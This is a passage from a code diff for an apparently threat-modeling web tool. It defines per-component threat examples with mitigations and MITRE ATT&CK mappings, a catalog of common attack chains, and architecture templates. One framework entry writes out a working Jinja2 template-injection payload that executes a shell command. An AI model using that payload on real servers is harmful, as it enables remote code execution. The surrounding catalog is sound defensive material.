+        '#10': { typicalImpl: 'Compromised auth library introduces backdoor, malicious update disables validation, dependency confusion on auth package', example: 'A compromised version of the auth library silently accepts any token signature, effectively disabling all authentication.', paths: ['#10 → #4 (compromised auth library → identity theft)', '#10 → #1 (backdoor enables unauthorized function access)'], mitigations: ['Pin auth library versions strictly', 'Security audit critical dependencies', 'Use vendored/forked auth libraries for critical apps', 'Integrity verification of packages'], mitre: ['T1195.002 Supply Chain: Software Supply Chain'] }
+      },
+      'crypto-library': {
+        '#10': { typicalImpl: 'Backdoored random number generator, weakened encryption algorithms in library update, compromised signing keys', example: 'Crypto library update introduces a subtle weakness in the PRNG, making generated keys predictable to attackers with knowledge of the backdoor.', paths: ['#10 → #5 (weakened crypto enables MitM decryption)', '#10 → #4 (predictable tokens enable identity theft)'], mitigations: ['Use well-audited, established crypto libraries', 'Pin versions and verify checksums', 'Monitor for CVEs in crypto dependencies', 'Cryptographic agility in design'], mitre: ['T1195.002 Supply Chain: Software Supply Chain', 'T1600 Weaken Encryption'] }
+      },
+      'framework': {
+        '#1': { typicalImpl: 'Framework debug mode in production, auto-generated admin routes, permissive CORS defaults, mass assignment vulnerabilities', example: 'Django DEBUG=True in production exposes detailed error pages with stack traces, environment variables, and database queries to any visitor.', paths: ['#1 → #2 (info disclosure reveals exploitable endpoints)', '#1 → #4 (leaked credentials in debug output)'], mitigations: ['Disable debug mode in production', 'Review framework-generated routes', 'Harden CORS and security middleware', 'Use framework security checklists'], mitre: ['T1190 Exploit Public-Facing App'] },
+        '#2': { typicalImpl: 'Framework-level vulnerabilities (e.g., Spring4Shell, Log4Shell), template injection, routing bugs, middleware bypass', example: 'Attacker exploits a Server-Side Template Injection (SSTI) in the Jinja2 templating engine to execute Python code: {{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}', paths: ['#2 → #7 (framework exploit → code execution on server)'], mitigations: ['Keep framework patched and up-to-date', 'Use template auto-escaping', 'Enable security middleware (CSRF, XSS protection)', 'Subscribe to framework security advisories'], mitre: ['T1190 Exploit Public-Facing App', 'T1059 Command and Scripting Interpreter'] },
+        '#10': { typicalImpl: 'Compromised framework distribution, backdoored framework plugin, malicious middleware in framework ecosystem', example: 'A popular Express.js middleware is compromised (like ua-parser-js incident), injecting a cryptominer into all applications using it.', paths: ['#10 → #7 (compromised framework component executes malware)'], mitigations: ['Lock framework and plugin versions', 'Use npm/pip audit regularly', 'Monitor for supply chain advisories', 'Minimal middleware principle'], mitre: ['T1195.002 Supply Chain: Software Supply Chain'] }
+      },
+      'orm': {
+        '#2': { typicalImpl: 'ORM injection bypassing parameterization, raw query vulnerabilities, mass assignment via ORM models, N+1 query exploitation', example: 'Developer uses ORM\'s raw query method with string concatenation, accidentally reintroducing SQL injection that the ORM was supposed to prevent.', paths: ['#2 → #7 (ORM injection → RCE via DB features)', '#2 + [DRE: C,I] (data breach via ORM bypass)'], mitigations: ['Never use raw queries with user input', 'Use ORM\'s built-in parameterization', 'Guard model fields against mass assignment', 'Enable query logging in development'], mitre: ['T1190 Exploit Public-Facing App'] },
+        '#10': { typicalImpl: 'Compromised ORM package, backdoored database adapter, dependency confusion on ORM library', example: 'Compromised ORM update silently logs all queries including sensitive data to an external endpoint controlled by the attacker.', paths: ['#10 → #2 (compromised ORM introduces injection vectors)', '#10 + [DRE: C] (data exfiltration via backdoor)'], mitigations: ['Pin ORM versions', 'Review ORM update changelogs', 'Software Composition Analysis', 'Monitor outbound network traffic'], mitre: ['T1195.002 Supply Chain: Software Supply Chain'] }
+      },
+      // External services
+      'cache': {
+        '#1': { typicalImpl: 'Cache poisoning via legitimate API, key enumeration, unauthorized cache flush, stored data manipulation', example: 'Attacker discovers predictable Redis key patterns and reads cached session data for other users by guessing their session keys.', paths: ['#1 → #4 (cache read → session hijacking)', '#1 + [DRE: C] (cached data exposure)'], mitigations: ['Randomized and unpredictable cache keys', 'Authentication required for cache access', 'Network segmentation (cache not internet-facing)', 'Encryption of sensitive cached data'], mitre: ['T1005 Data from Local System', 'T1552 Unsecured Credentials'] },
+        '#4': { typicalImpl: 'Unauthenticated Redis access, shared cache credentials, credential reuse for cache connection', example: 'Redis instance deployed without requirepass, allowing any application on the network to read/write all cached data including sessions.', paths: ['#4 → #1 (cache access → data manipulation)'], mitigations: ['Enable authentication (requirepass/ACLs)', 'TLS for cache connections', 'Network segmentation', 'Unique credentials per application'], mitre: ['T1552 Unsecured Credentials'] },
+        '#6': { typicalImpl: 'Cache memory exhaustion, key flooding, eviction policy abuse, connection limit exhaustion', example: 'Attacker floods cache with millions of unique keys, exhausting memory and causing eviction of legitimate session data.', paths: ['#6 + [DRE: A] (cache exhaustion → application degradation)'], mitigations: ['Memory limits and eviction policies', 'Key TTL enforcement', 'Connection limits', 'Monitoring and alerting on memory usage'], mitre: ['T1499 Endpoint DoS'] }
+      },
+      'queue': {
+        '#1': { typicalImpl: 'Queue flooding with legitimate messages, priority queue manipulation, poison message attacks, message replay', example: 'Attacker sends millions of valid-format messages to a priority queue, pushing legitimate high-priority messages to the back.', paths: ['#1 → #6 (queue abuse → consumer resource exhaustion)'], mitigations: ['Message authentication and authorization', 'Queue depth limits and dead letter queues', 'Message deduplication', 'Rate limiting per producer'], mitre: ['T1499 Endpoint DoS', 'T1565 Data Manipulation'] },
+        '#6': { typicalImpl: 'Message volume flooding, oversized message attacks, consumer starvation, queue storage exhaustion', example: 'Attacker sends oversized messages that consume all available queue storage, preventing legitimate messages from being enqueued.', paths: ['#6 + [DRE: A] (queue full → message loss → service disruption)'], mitigations: ['Message size limits', 'Queue storage quotas', 'Auto-scaling consumers', 'Overflow routing to secondary queues'], mitre: ['T1499 Endpoint DoS'] }
+      },
+      'storage': {
+        '#1': { typicalImpl: 'Publicly accessible S3 buckets, overly permissive ACLs, presigned URL abuse, versioning exploitation', example: 'S3 bucket policy misconfigured to allow public ListBucket and GetObject, exposing all stored files to the internet.', paths: ['#1 + [DRE: C] (public bucket → data exposure)', '#4 → #1 (stolen cloud credentials → storage access)'], mitigations: ['Block public access by default', 'Least-privilege IAM policies', 'Enable access logging', 'Regular bucket policy audits'], mitre: ['T1530 Data from Cloud Storage', 'T1537 Transfer Data to Cloud Account'] },
+        '#4': { typicalImpl: 'Stolen cloud storage credentials, shared access keys, presigned URL token leakage, cross-account access abuse', example: 'Presigned S3 URL with long expiry is shared via email, leaked, and used by unauthorized parties to download sensitive documents.', paths: ['#4 + [DRE: C] (credential use → data access)'], mitigations: ['Short-lived presigned URLs', 'IAM role-based access (no long-lived keys)', 'VPC endpoints for storage access', 'CloudTrail monitoring'], mitre: ['T1530 Data from Cloud Storage', 'T1078 Valid Accounts'] }
+      },
+      'idp': {
+        '#1': { typicalImpl: 'OAuth scope escalation, consent flow bypass, federation configuration abuse, SAML assertion manipulation', example: 'Attacker exploits permissive OAuth configuration to request admin scopes that the IdP grants without proper consent verification.', paths: ['#1 → #4 (IdP misconfiguration → token with elevated permissions)', '#1 → #10 (federation abuse crosses trust boundary)'], mitigations: ['Strict scope definitions and consent flows', 'Regular review of OAuth client configurations', 'SAML assertion validation', 'Federation trust review process'], mitre: ['T1078 Valid Accounts', 'T1550.001 Application Access Token'] },
+        '#4': { typicalImpl: 'Password spraying against IdP, stolen SAML signing keys, session token theft, MFA fatigue attacks on IdP', example: 'Attacker performs password spray against Azure AD, finding accounts using compromised passwords from public breach lists.', paths: ['#4 → #10 (IdP compromise → federated access to all relying parties)', '#9 → #4 (phishing → IdP credential capture)'], mitigations: ['Phishing-resistant MFA (FIDO2)', 'Smart lockout / adaptive authentication', 'Credential breach monitoring', 'Conditional access policies'], mitre: ['T1110.003 Password Spraying', 'T1078.004 Cloud Accounts'] },
+        '#9': { typicalImpl: 'Consent phishing via OAuth, fake IdP login pages, MFA fatigue/bombing, social engineering helpdesk for password reset', example: 'Attacker sends OAuth consent phishing email: user clicks "Grant Access" to a malicious app that requests Mail.Read, Files.ReadWrite scopes.', paths: ['#9 → #4 (social engineering → credential capture at IdP)', '#9 → #1 (helpdesk reset → unauthorized access)'], mitigations: ['Admin consent workflow for sensitive scopes', 'Phishing-resistant authentication', 'User education on OAuth consent', 'Helpdesk identity verification procedures'], mitre: ['T1566.002 Spearphishing Link', 'T1528 Steal Application Access Token'] },
+        '#10': { typicalImpl: 'Compromised IdP vendor, federated trust exploitation, malicious IdP assertion injection, IdP supply chain compromise', example: 'Attacker compromises the SaaS IdP provider (like SolarWinds/Okta incident) and forges SAML assertions to access all federated applications.', paths: ['#10 → #4 (IdP compromise → forged assertions → identity theft)', '#4 → #10 ||[auth][@Vendor(IdP)→@Org(SP)]|| → #1 (federation attack chain)'], mitigations: ['Multi-IdP strategy for critical apps', 'SAML assertion validation (audience, timing, signature)', 'IdP vendor security assessments', 'Break-glass accounts independent of IdP'], mitre: ['T1199 Trusted Relationship', 'T1550.001 Application Access Token'] }
+      },
+      'third-party-api': {
+        '#1': { typicalImpl: 'API abuse via legitimate endpoints, excessive data returned by third-party API, rate limit bypass on external API', example: 'Third-party payment API returns full card details in response when only a token was expected, exposing PCI data in application logs.', paths: ['#1 + [DRE: C] (third-party API over-shares data)'], mitigations: ['Validate and filter third-party API responses', 'Minimize data requested from APIs', 'Log sanitization', 'API response schema validation'], mitre: ['T1530 Data from Cloud Storage'] },
+        '#6': { typicalImpl: 'Third-party API rate limiting causing cascading failures, dependency on unavailable external service, API cost exhaustion', example: 'Third-party geocoding API goes down during peak hours, causing cascading timeout failures across the entire application.', paths: ['#6 + [DRE: A] (external API failure → application degradation)'], mitigations: ['Circuit breakers for external API calls', 'Graceful degradation patterns', 'Response caching for external APIs', 'SLA monitoring and alerting'], mitre: ['T1499 Endpoint DoS'] },
+        '#10': { typicalImpl: 'Compromised third-party API serving malicious data, API provider breach affecting downstream consumers, man-in-the-cloud', example: 'Third-party API provider is compromised and begins returning malicious JavaScript payloads in API responses that execute in client browsers.', paths: ['#10 → #7 (compromised API delivers malicious content)', '#10 → #3 (malicious API response exploits client parser)'], mitigations: ['Validate and sanitize all external API responses', 'Use Subresource Integrity where applicable', 'Vendor security assessment program', 'Independent security monitoring of API responses'], mitre: ['T1195.002 Supply Chain: Software Supply Chain', 'T1199 Trusted Relationship'] }
+      },
+      'cdn': {
+        '#5': { typicalImpl: 'CDN cache poisoning, BGP hijacking of CDN traffic, TLS certificate issues on CDN edges, subdomain takeover via CDN', example: 'Attacker exploits a web cache poisoning vulnerability to inject malicious JavaScript into CDN-cached responses served to all visitors.', paths: ['#5 → #3 (cache poisoning → client exploitation)', '#5 → #7 (injected content delivers malware)'], mitigations: ['Cache key normalization', 'Strict cache-control headers', 'Content integrity verification', 'DNSSEC for CDN domains'], mitre: ['T1557 Adversary-in-the-Middle', 'T1584.006 Web Services'] },
+        '#6': { typicalImpl: 'CDN origin shield bypass, cache bust flooding, CDN bandwidth exhaustion, amplification attacks via CDN', example: 'Attacker sends unique query strings with each request, bypassing CDN cache and flooding the origin server directly.', paths: ['#6 + [DRE: A] (CDN bypass → origin overload)'], mitigations: ['Normalize cache keys (ignore unnecessary query params)', 'Origin rate limiting behind CDN', 'DDoS protection at CDN level', 'Cost alerting for CDN bandwidth'], mitre: ['T1498 Network DoS'] },
+        '#10': { typicalImpl: 'CDN provider compromise, hijacked CDN distribution, malicious content injection at CDN edge, CDN configuration takeover', example: 'Attacker gains access to CDN management console and modifies routing rules to serve a trojanized version of the application JavaScript.', paths: ['#10 → #7 (CDN compromise → malware delivery to all users)', '#10 → #3 (modified CDN content exploits clients)'], mitigations: ['Subresource Integrity (SRI) tags', 'CDN access control with MFA', 'Content hash verification', 'Multi-CDN strategy for critical assets'], mitre: ['T1195.002 Supply Chain: Software Supply Chain'] }
+      },
+      // Human actors
+      'user': {
+        '#9': { typicalImpl: 'Phishing emails, pretexting calls, watering hole attacks, social media reconnaissance, physical tailgating', example: 'User receives a convincing phishing email mimicking an IT password reset, enters credentials on a fake portal, attacker gains access.', paths: ['#9 → #4 (credential phishing)', '#9 → #7 (user downloads malware)', '#9 → #1 (user tricked into changing config)'], mitigations: ['Security awareness training (regular)', 'Phishing simulations', 'Phishing-resistant MFA', 'Incident reporting culture'], mitre: ['T1566 Phishing', 'T1598 Phishing for Information'] }
+      },
+      'admin': {
+        '#4': { typicalImpl: 'Admin credential theft, privileged session hijacking, admin API key compromise, MFA bypass for admin accounts', example: 'Attacker targets admin via spearphishing, captures admin credentials, uses them to access cloud management console with full privileges.', paths: ['#9 → #4 (phishing → admin credential capture)', '#4 → #1 (admin access → full system control)'], mitigations: ['Phishing-resistant MFA for all admin accounts', 'Privileged Access Management (PAM)', 'Just-in-time admin access', 'Admin activity monitoring and alerting'], mitre: ['T1078.004 Cloud Accounts', 'T1110 Brute Force'] },
+        '#9': { typicalImpl: 'Spearphishing targeting admins, CEO fraud / BEC, helpdesk social engineering, insider threat via manipulation', example: 'Attacker impersonates CEO via email, urgently requesting admin to disable MFA for a "VIP account", which is actually the attacker\'s.', paths: ['#9 → #4 (admin manipulation → credential handover)', '#9 → #1 (admin tricked into config change)'], mitigations: ['Verification procedures for privileged requests', 'Dual-approval for high-impact changes', 'Out-of-band confirmation for sensitive operations', 'Security awareness training for admins'], mitre: ['T1566.001 Spearphishing Attachment', 'T1534 Internal Spearphishing'] }
+      },
+      // Infrastructure components (generic threats)
+      'vm': {
+        '#1': { typicalImpl: 'VM escape via hypervisor features, snapshot/clone abuse, resource allocation manipulation, management API abuse', example: 'Attacker abuses VM management API to take snapshots of production VMs and mount them on an attacker-controlled instance for data extraction.', paths: ['#1 → #4 (VM snapshot → credential extraction)', '#4 → #1 (stolen cloud creds → VM management abuse)'], mitigations: ['Least-privilege VM management access', 'Disable unnecessary VM features', 'Audit VM lifecycle operations', 'Encrypt VM disks'], mitre: ['T1578 Modify Cloud Compute Infrastructure', 'T1537 Transfer Data to Cloud Account'] },
+        '#6': { typicalImpl: 'CPU/memory exhaustion via workload, disk I/O flooding, network bandwidth saturation, noisy neighbor attacks', example: 'Co-tenant on shared hypervisor launches CPU-intensive workload, causing performance degradation for neighboring VMs.', paths: ['#6 + [DRE: A] (resource exhaustion → service degradation)'], mitigations: ['Resource limits and reservations', 'Monitoring and auto-scaling', 'Dedicated/isolated instances for critical workloads', 'Performance baseline alerting'], mitre: ['T1499 Endpoint DoS'] },
+        '#7': { typicalImpl: 'Malware persistence in VM, rootkit installation, cryptominer deployment, RAT implant in VM image', example: 'Attacker deploys a cryptominer on a compromised VM, consuming CPU resources and running persistently via systemd service.', paths: ['#4 → #7 (credential access → malware deployment on VM)', '#2 → #7 (exploit → code execution on VM)'], mitigations: ['Endpoint Detection and Response (EDR)', 'File integrity monitoring', 'Immutable VM images (golden images)', 'Regular VM rebuilds from clean images'], mitre: ['T1496 Resource Hijacking', 'T1543 Create or Modify System Process'] }
+      },
+      'container': {
+        '#1': { typicalImpl: 'Container escape via privileged mode, host filesystem mounting, Docker socket exposure, capabilities abuse', example: 'Container runs with --privileged flag, allowing attacker to mount the host filesystem and read /etc/shadow for credential hashes.', paths: ['#1 → #8 (container escape → host access)', '#1 → #7 (Docker socket → arbitrary container creation)'], mitigations: ['Never run containers as privileged', 'Drop all unnecessary capabilities', 'Read-only root filesystem', 'Seccomp/AppArmor profiles'], mitre: ['T1611 Escape to Host', 'T1610 Deploy Container'] },
+        '#6': { typicalImpl: 'Container resource exhaustion (fork bomb), memory limit bypass, storage driver exhaustion, container sprawl', example: 'Compromised container runs a fork bomb, exhausting all available PIDs on the host and affecting all co-located containers.', paths: ['#6 + [DRE: A] (container DoS → host impact)'], mitigations: ['Set CPU/memory/PID limits', 'Resource quotas per namespace', 'Container runtime monitoring', 'Pod disruption budgets'], mitre: ['T1499 Endpoint DoS'] },
+        '#7': { typicalImpl: 'Malicious container image, cryptominer in container, reverse shell from container, container-based botnet node', example: 'Developer pulls a trojanized base image from public registry that contains a hidden reverse shell activated on container start.', paths: ['#10 → #7 (malicious base image → malware execution)', '#2 → #7 (app exploit → code execution in container)'], mitigations: ['Image scanning in CI/CD pipeline', 'Use signed/verified base images', 'Minimal base images (distroless/scratch)', 'Runtime security monitoring'], mitre: ['T1610 Deploy Container', 'T1525 Implant Internal Image'] }
+      },
+      'serverless': {
+        '#1': { typicalImpl: 'Event injection via legitimate triggers, overpermissive IAM roles, environment variable leakage, cold start abuse', example: 'Lambda function has AdministratorAccess IAM role. Attacker exploiting any input flaw instantly gains full AWS account control.', paths: ['#1 → #4 (function abuse → credential/token extraction)', '#2 → #1 (exploit function → abuse its IAM permissions)'], mitigations: ['Least-privilege IAM roles per function', 'Input validation for all event sources', 'Encrypt environment variables', 'Function-level logging and monitoring'], mitre: ['T1078 Valid Accounts', 'T1059 Command and Scripting Interpreter'] },
+        '#2': { typicalImpl: 'Injection in serverless function (SQL/NoSQL/command), deserialization in event processing, SSRF via function', example: 'Attacker sends crafted event payload that exploits command injection in a Lambda function processing S3 object names.', paths: ['#2 → #7 (function exploit → code execution in runtime)', '#2 + [DRE: C] (SSRF accessing cloud metadata)'], mitigations: ['Input validation for all event sources', 'Parameterized queries', 'SSRF protection (block metadata endpoints)', 'Function timeout limits'], mitre: ['T1190 Exploit Public-Facing App', 'T1059 Command and Scripting Interpreter'] },
+        '#6': { typicalImpl: 'Invocation flooding (billing DoS), recursive function triggers, concurrency limit exhaustion, timeout abuse', example: 'Attacker triggers millions of Lambda invocations via public API, exhausting concurrency limits and causing $50K+ in cloud costs.', paths: ['#6 + [DRE: A] (concurrency exhaustion → service denial)', '#6 → cost impact (billing DoS)'], mitigations: ['Concurrency limits per function', 'Budget alerts and spending caps', 'Rate limiting at API Gateway', 'Dead letter queue for overflow'], mitre: ['T1499 Endpoint DoS'] }
+      },
+      'host': {
+        '#1': { typicalImpl: 'BIOS/UEFI configuration abuse, boot order manipulation, management interface (IPMI/iLO/iDRAC) exploitation', example: 'Attacker with management network access uses default IPMI credentials to remotely power on and attach virtual media with malicious OS.', paths: ['#1 → #7 (management interface → malware deployment)', '#1 → #8 (remote management → physical-equivalent access)'], mitigations: ['Change default management credentials', 'Isolate management interfaces on separate VLAN', 'Disable unnecessary management features', 'BIOS/UEFI password protection'], mitre: ['T1542 Pre-OS Boot', 'T1200 Hardware Additions'] },
+        '#6': { typicalImpl: 'CPU/memory/disk exhaustion, power supply overload, fan failure exploitation, heat-based degradation', example: 'Cryptomining malware maxes out all CPU cores, causing thermal throttling and degraded performance for all hosted services.', paths: ['#6 + [DRE: A] (resource exhaustion → host degradation)'], mitigations: ['Resource monitoring and alerting', 'Thermal management', 'Redundant power supplies', 'Capacity planning'], mitre: ['T1496 Resource Hijacking'] },
+        '#7': { typicalImpl: 'BIOS/firmware rootkits, bootkits, kernel-level malware, hardware implants with firmware payloads', example: 'Attacker with physical access installs a firmware rootkit that persists across OS reinstallation and evades all software-based security tools.', paths: ['#8 → #7 (physical access → firmware malware)', '#10 → #7 (supply chain hardware implant)'], mitigations: ['Secure Boot and Measured Boot', 'TPM-based integrity verification', 'Firmware update authentication', 'Physical security controls'], mitre: ['T1542 Pre-OS Boot', 'T1195.003 Supply Chain: Hardware'] },
+        '#8': { typicalImpl: 'Server room break-in, hardware theft, USB device insertion, network cable tapping, hard drive removal', example: 'Attacker gains physical access to server room and connects a rogue device to the network switch for persistent network access.', paths: ['#8 → #5 (physical tap → network interception)', '#8 → #7 (USB insertion → malware execution)', '#8 → #4 (device theft → credential extraction)'], mitigations: ['Physical access controls (badge, biometric)', 'CCTV and intrusion detection', 'Port security (disable unused ports)', 'Full disk encryption'], mitre: ['T1200 Hardware Additions', 'T1091 Replication Through Removable Media'] }
+      }
+    };
+
+    // Helper: get threat example for a component type and cluster
+    const getThreatExample = (componentType, clusterId) => {
+      return THREAT_EXAMPLES[componentType]?.[clusterId] || null;
+    };
+
+    // ============== CLIENT-SERVER ROLE RESOLUTION ==============
+    const resolveClientServerRoles = (fromComp, toComp) => {
+      const fromRole = COMPONENT_ROLE_HINTS[fromComp.type] || 'neutral';
+      const toRole = COMPONENT_ROLE_HINTS[toComp.type] || 'neutral';
+      // Clear case: from=client, to=server
+      if (fromRole === 'client' && toRole === 'server') return { client: fromComp, server: toComp, confidence: 'high' };
+      // Reversed: from=server, to=client (push/callback)
+      if (fromRole === 'server' && toRole === 'client') return { client: toComp, server: fromComp, confidence: 'medium' };
+      // Both servers: arrow direction = caller is client
+      if (fromRole === 'server' && toRole === 'server') return { client: fromComp, server: toComp, confidence: 'medium' };
+      // Both clients: unusual, use arrow direction
+      if (fromRole === 'client' && toRole === 'client') return { client: fromComp, server: toComp, confidence: 'low' };
+      // One neutral: use arrow direction (from = caller = client)
+      return { client: fromComp, server: toComp, confidence: 'low' };
+    };
+
+    // ============== COMMON ATTACK CHAINS ==============
+    const COMMON_ATTACK_CHAINS = [
+      { id: 'phishing-to-api', name: 'Phishing → Credential Use → API Abuse', pattern: { clientTypes: ['client-browser', 'client-mobile', 'user', 'admin'], serverTypes: ['api-endpoint', 'web-server', 'idp'] }, chain: ['#9', '#4', '#1'], desc: 'Social engineering captures credentials, enabling abuse of legitimate application functions.', example: 'Phishing email → user enters creds on fake login → attacker uses session to export data via admin API' },
+      { id: 'xss-session-hijack', name: 'XSS → Session Hijacking', pattern: { clientTypes: ['client-browser'], serverTypes: ['web-server', 'api-endpoint'] }, chain: ['#3', '#4'], desc: 'Client-side exploit in browser steals session tokens, enabling identity impersonation.', example: 'Stored XSS in comment field steals session cookie → attacker replays cookie to access victim\'s account' },
+      { id: 'sqli-to-rce', name: 'SQL Injection → Remote Code Execution', pattern: { clientTypes: ['api-endpoint', 'web-server', 'app-logic'], serverTypes: ['database'] }, chain: ['#2', '#7'], desc: 'Server-side injection flaw enables malware execution on the database server via OS-execution features.', example: 'SQL injection via search parameter → xp_cmdshell executes PowerShell reverse shell on DB server' },
+      { id: 'sqli-data-breach', name: 'SQL Injection → Data Breach', pattern: { clientTypes: ['api-endpoint', 'web-server', 'app-logic'], serverTypes: ['database'] }, chain: ['#2'], desc: 'Server-side injection flaw directly causes unauthorized data access (Loss of Confidentiality).', example: 'SQL injection in login form → UNION SELECT extracts password hashes → [DRE: C]' },
+      { id: 'supply-chain-malware', name: 'Supply Chain → Malware Execution', pattern: { clientTypes: ['*'], serverTypes: ['third-party-api', 'cdn'] }, chain: ['#10', '#7'], desc: 'Compromised third-party component delivers malicious executable content.', example: 'Compromised npm package (event-stream) injects cryptominer into production build' },
+      { id: 'ransomware-chain', name: 'Ransomware Attack Chain', pattern: { clientTypes: ['client-browser', 'user', 'admin'], serverTypes: ['api-endpoint', 'web-server', 'database', 'storage'] }, chain: ['#9', '#7', '#4', '#1'], desc: 'Full ransomware lifecycle: initial access via social engineering → malware deployment → credential harvesting → data encryption.', example: 'Phishing → macro dropper → Mimikatz credential dump → BitLocker/encryption via admin tools (LOLBAS)' },
+      { id: 'mitm-credential', name: 'MitM → Credential Interception', pattern: { clientTypes: ['client-browser', 'client-mobile'], serverTypes: ['api-endpoint', 'web-server', 'idp'] }, chain: ['#5', '#4'], desc: 'Network interception captures authentication credentials in transit.', example: 'Rogue WiFi AP → SSL stripping → captured login credentials used to access accounts' },
+      { id: 'physical-to-malware', name: 'Physical Access → Malware Installation', pattern: { clientTypes: ['user', 'admin'], serverTypes: ['host', 'vm', 'container'] }, chain: ['#8', '#7'], desc: 'Physical access to hardware enables direct malware installation (e.g., USB drop, evil maid).', example: 'Attacker inserts USB with rubber ducky payload → executes PowerShell backdoor on workstation' },
+      { id: 'federation-abuse', name: 'IdP Compromise → Federated Access', pattern: { clientTypes: ['client-browser', 'admin'], serverTypes: ['idp'] }, chain: ['#4', '#10', '#1'], desc: 'Compromised IdP credentials enable trust exploitation across all federated service providers.', example: 'Stolen IdP admin creds → forge SAML assertion → access all federated SaaS apps as any user' },
+      { id: 'container-escape', name: 'Container Exploit → Host Compromise', pattern: { clientTypes: ['api-endpoint', 'app-logic', 'runtime-node', 'runtime-python'], serverTypes: ['container', 'k8s-pod'] }, chain: ['#2', '#1', '#7'], desc: 'Application exploit leads to container escape via privileged capabilities, then malware on host.', example: 'RCE in containerized app → mount host filesystem via privileged container → implant rootkit on host' },
+      { id: 'api-key-leak', name: 'Credential Leak → API Abuse → Data Exfil', pattern: { clientTypes: ['api-endpoint', 'app-logic', 'serverless'], serverTypes: ['database', 'storage', 'third-party-api'] }, chain: ['#4', '#1'], desc: 'Leaked credentials (hardcoded, in logs, in repos) enable direct abuse of backend services.', example: 'API key found in public GitHub repo → attacker accesses S3 bucket → downloads all customer data → [DRE: C]' },
+      { id: 'webshell-upload', name: 'File Upload → Webshell → Persistence', pattern: { clientTypes: ['client-browser', 'api-endpoint'], serverTypes: ['file-handler', 'web-server'] }, chain: ['#1', '#7', '#4'], desc: 'Legitimate file upload feature abused to deploy webshell, enabling persistent access and credential harvesting.', example: 'Upload .php webshell via image upload → execute commands on server → dump database credentials' }
+    ];
+
+    // Helper: detect attack paths for given interfaces and components
+    const detectAttackPaths = (ifaces, comps) => {
+      const detected = [];
+      for (const iface of ifaces) {
+        const fromComp = comps.find(c => c.id === iface.fromId);
+        const toComp = comps.find(c => c.id === iface.toId);
+        if (!fromComp || !toComp) continue;
+        for (const chain of COMMON_ATTACK_CHAINS) {
+          const fwd = (chain.pattern.clientTypes.includes('*') || chain.pattern.clientTypes.includes(fromComp.type)) &&
+                      (chain.pattern.serverTypes.includes('*') || chain.pattern.serverTypes.includes(toComp.type));
+          const rev = (chain.pattern.clientTypes.includes('*') || chain.pattern.clientTypes.includes(toComp.type)) &&
+                      (chain.pattern.serverTypes.includes('*') || chain.pattern.serverTypes.includes(fromComp.type));
+          if (fwd) detected.push({ ...chain, interfaceId: iface.id, fromName: fromComp.name, toName: toComp.name });
+          else if (rev) detected.push({ ...chain, interfaceId: iface.id, fromName: toComp.name, toName: fromComp.name });
+        }
+      }
+      return detected;
+    };
+
+    const GROUP_TYPES = [
+      { id: 'group-server', name: 'Server/Host', icon: '🖥️' },
+      { id: 'group-container', name: 'Container', icon: '📦' },
+      { id: 'group-pod', name: 'K8s Pod', icon: '☸️' },
+      { id: 'group-lambda', name: 'Lambda/Function', icon: '⚡' }
+    ];
+
+    const generateId = () => `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
+
+    // ============== EXAMPLE TEMPLATE BLUEPRINTS ==============
+    const EXAMPLE_TEMPLATES = [
+      { id: 'oauth-idp', name: 'OAuth/OIDC IdP Integration', icon: '🔑', desc: 'SaaS app with Google OAuth/OIDC. Demonstrates federated identity, session management, and supply chain trust.',
+        meta: { name: 'OAuth/OIDC IdP Integration', version: '1.0.0', sdlcPhase: 'Design', author: 'TLCTC Examples' },
+        groups: [
+          { ref: 'g1', name: 'User Environment', type: 'group-server', x: 30, y: 30, w: 280, h: 200, owner: '@User' },
+          { ref: 'g2', name: 'SaaS Application', type: 'group-server', x: 370, y: 30, w: 340, h: 400, owner: '@Org' },
+          { ref: 'g3', name: 'Google Identity Platform', type: 'group-server', x: 770, y: 30, w: 280, h: 200, owner: '@CloudProvider', thirdParty: true }
+        ],
+        components: [
+          { ref: 'c1', type: 'client-browser', name: 'User Browser', group: 'g1', x: 40, y: 60, owner: '@User' },
+          { ref: 'c2', type: 'web-server', name: 'SaaS Web App', group: 'g2', x: 30, y: 50, owner: '@Org' },
+          { ref: 'c3', type: 'auth-module', name: 'OAuth/OIDC Handler', group: 'g2', x: 170, y: 50, owner: '@Org' },
+          { ref: 'c4', type: 'auth-library', name: 'OAuth Client Library', group: 'g2', x: 30, y: 170, owner: '@Org', thirdParty: true },
+          { ref: 'c5', type: 'database', name: 'User Profile DB', group: 'g2', x: 170, y: 170, owner: '@Org' },
+          { ref: 'c6', type: 'cache', name: 'Session Store (Redis)', group: 'g2', x: 100, y: 280, owner: '@Org' },
+          { ref: 'c7', type: 'idp', name: 'Google OAuth/OIDC', group: 'g3', x: 60, y: 60, owner: '@CloudProvider', thirdParty: true }
+        ],
+        interfaces: [
+          { from: 'c1', to: 'c2', protocol: 'HTTPS', port: '443' },
+          { from: 'c1', to: 'c7', protocol: 'HTTPS', port: '443' },
+          { from: 'c2', to: 'c3', protocol: 'Internal Call', port: '-' },
+          { from: 'c3', to: 'c4', protocol: 'Internal Call', port: '-' },
+          { from: 'c3', to: 'c7', protocol: 'HTTPS', port: '443' },
+          { from: 'c2', to: 'c5', protocol: 'TCP', port: '5432' },
+          { from: 'c2', to: 'c6', protocol: 'TCP', port: '6379' }
+        ]
+      },
+      { id: 'healthcare', name: 'Healthcare Patient Portal', icon: '🏥', desc: 'HIPAA-compliant patient portal with EHR integration, mobile app, and clinician access.',
+        meta: { name: 'Healthcare Patient Portal', version: '1.0.0', sdlcPhase: 'Design', author: 'TLCTC Examples' },
+        groups: [
+          { ref: 'g1', name: 'Patient Portal Server', type: 'group-server', x: 330, y: 30, w: 380, h: 450, owner: '@Org' },
+          { ref: 'g2', name: 'EHR Integration Layer', type: 'group-server', x: 770, y: 30, w: 280, h: 280, owner: '@Vendor', thirdParty: true },
+          { ref: 'g3', name: 'Patient PC', type: 'group-server', x: 30, y: 30, w: 240, h: 120, owner: '@User' },
+          { ref: 'g4', name: 'Patient Smartphone', type: 'group-server', x: 30, y: 170, w: 240, h: 120, owner: '@User' },
+          { ref: 'g5', name: 'Clinician Workstation', type: 'group-server', x: 30, y: 310, w: 240, h: 120, owner: '@Org' }
+        ],
+        components: [
+          { ref: 'c1', type: 'client-browser', name: 'Patient Browser', group: 'g3', x: 40, y: 40, owner: '@User' },
+          { ref: 'c2', type: 'client-mobile', name: 'Patient Mobile App', group: 'g4', x: 40, y: 40, owner: '@User' },
+          { ref: 'c3', type: 'client-browser', name: 'Clinician Browser', group: 'g5', x: 40, y: 40, owner: '@Org' },
